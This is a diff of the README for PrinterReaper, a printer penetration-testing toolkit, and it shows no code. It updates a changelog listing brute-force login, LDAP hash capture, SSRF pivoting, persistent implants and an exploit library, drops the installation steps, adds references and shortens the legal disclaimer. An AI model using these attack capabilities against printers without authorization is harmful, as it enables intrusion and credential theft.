-| 3.4.0 | 2026-03-24 | Exploit library (`xpl/`), `--xpl-list/check/run/fetch`, exploit auto-matching on scan |
-| 3.3.0 | 2026-03-24 | `--attack-matrix`, `--network-map`, XSP/CORS spoofing, NVD API integration |
-| 3.2.0 | 2026-03-24 | IPP attack suite, SSRF pivot, storage access, firmware audit, persistent implants |
-| 3.1.0 | 2026-03-24 | `--scan/--scan-ml`, CVE scanner, ML fingerprint engine, config.yaml, Shodan |
-| 3.0.0 | 2026-03-24 | IPv6, SMB complete, pysnmp v5/v7, IPP/TLS fallback, local discovery, 63 QA tests |
-| 2.5.x | 2025-10-05 | Cross-platform (Windows/Linux/macOS/Android), PRET assets, overlay commands |
+| **3.7.0** | 2026-03-25 | Zero hardcoded creds, wordlist engine, draw.io diagrams, PNG assets |
+| 3.6.2 | 2026-03-25 | LDAP hash capture, CVE-2024-51978, 5 new vendors |
+| 3.6.0 | 2026-03-24 | 7 new BlackHat 2017 exploits + EDB research modules |
+| 3.5.0 | 2026-03-24 | `--send-job`, wordlists subfolder, emoji-free CLI |
+| 3.4.2 | 2026-03-24 | Interactive guided menu, spinner, next-steps hints |
+| 3.4.1 | 2026-03-24 | Login brute-force engine, variation generator |
+| 3.4.0 | 2026-03-24 | Exploit library (xpl/), --xpl-* flags, auto-matching |
+| 3.3.0 | 2026-03-24 | --attack-matrix, --network-map, XSP/CORS spoofing |
+| 3.2.0 | 2026-03-24 | IPP attacks, SSRF pivot, storage, firmware, implants |
+| 3.1.0 | 2026-03-24 | --scan/--scan-ml, CVE scanner, ML engine, Shodan |
+| 3.0.0 | 2026-03-24 | IPv6, SMB, pysnmp v5/v7, IPP/TLS, local discovery |
+| 2.5.x | 2025-10-05 | Cross-platform, PRET fork, 109 commands |
 
 ---
 
-## Installation
+## References
 
-### Requirements
-
-- Python 3.8+
-- Windows, Linux, macOS, or BSD (Android/Termux: limited support)
-
-### Full install
-
-```bash
-git clone https://github.com/mrhenrike/PrinterReaper.git
-cd PrinterReaper
-
-# Recommended: virtual environment
-python -m venv .venv
-.venv\Scripts\activate     # Windows PowerShell
-source .venv/bin/activate  # Linux / macOS
-
-pip install -r requirements.txt
-```
-
-### Optional tools
-
-```bash
-# SNMP discovery (Ubuntu/Debian)
-sudo apt install snmp snmp-mibs-downloader
-
-# SNMP discovery (macOS)
-brew install net-snmp
-```
-
-### Dependencies
-
-```
-requests>=2.31.0        HTTP client
-urllib3>=2.0.0          HTTP helpers
-pysnmp>=4.4.12          SNMP v1/v2c/v3
-pysmb>=1.2.9            SMB printing
-shodan>=1.31.0          Shodan API
-censys>=2.2.6           Censys API
-scikit-learn>=1.4.0     ML fingerprinting (optional)
-colorama>=0.4.6         Terminal colors
-```
+- Müller et al. — *Exploiting Network Printers*, BlackHat USA 2017
+- [Hacking Printers Wiki](http://hacking-printers.net)
+- [ExploitDB — Printer exploits](https://www.exploit-db.com/search?q=printer&verified=true)
+- [NVD — National Vulnerability Database](https://nvd.nist.gov)
+- [PRET — Printer Exploitation Toolkit](https://github.com/RUB-NDS/PRET)
 
 ---
 
 ## Legal Disclaimer
 
-PrinterReaper is developed for **authorized security research, penetration testing, and educational purposes only**.
-
-Using this tool against systems you do not own or have explicit written permission to test is **illegal** and unethical. The author assumes no liability for misuse or damage.
-
-Always obtain proper authorization before testing any device.
+PrinterReaper is developed for **authorized security research, penetration testing, and educational purposes only**. Using this tool against systems you do not own or have explicit written authorization to test is **illegal**. The author assumes no liability for misuse.
 
 ---
 
-## Author
+<div align="center">
 
-**Andre Henrique** — [@mrhenrike](https://github.com/mrhenrike)
-[LinkedIn](https://linkedin.com/in/mrhenrike) · [X/Twitter](https://x.com/mrhenrike)
+**PrinterReaper v3.7.0**
+*Advanced Printer Penetration Testing Toolkit*
 
-References:
-- Müller, J. et al. — *Exploiting Network Printers*, BlackHat USA 2017
-- [Hacking Printers Wiki](http://hacking-printers.net)
-- [ExploitDB Printer Exploits](https://www.exploit-db.com/search?q=printer)
-- [NVD — National Vulnerability Database](https://nvd.nist.gov)
+Made with care for the security community.
+
+[Documentation](https://github.com/mrhenrike/PrinterReaper/wiki) | [Issues](https://github.com/mrhenrike/PrinterReaper/issues) | [Releases](https://github.com/mrhenrike/PrinterReaper/releases)
+
+---
+
+### Powered by União Geek
+
+<a href="https://www.uniaogeek.com.br"><img src="img/logotype-uniaogeek-2.png" width="240" alt="União Geek"></a>
+
+**[www.uniaogeek.com.br](https://www.uniaogeek.com.br)**
+
+</div>
